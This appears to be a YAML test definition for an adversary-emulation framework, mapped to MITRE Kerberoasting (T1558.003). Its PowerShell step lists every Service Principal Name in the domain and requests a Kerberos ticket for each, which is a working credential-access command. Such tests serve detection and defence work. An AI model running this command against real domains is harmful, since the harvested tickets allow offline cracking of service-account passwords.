api_version: "2.0"
name: Request All Tickets via PowerShell
description: "The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. \nA successful execution will output the SPNs for the domain in question.\n"
args:
    - name: domain_name
      type: string
      default: '%USERDNSDOMAIN%'
uuid: 902f4ed2-1aba-4133-90f2-cff6d299d6da
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1558: Steal or Forge Kerberos Tickets'
    subtechniques:
        - 'T1558.003: Kerberoasting'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Computer must be domain joined
      inline: |
        if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {{Write-Host Joining this computer to a domain must be done manually
        }}
      executor: powershell
    - name: request-all-tickets-via-powershell
      inline: "Add-Type -AssemblyName System.IdentityModel  \nsetspn.exe -T {{.Args.domain_name}} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  \n"
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
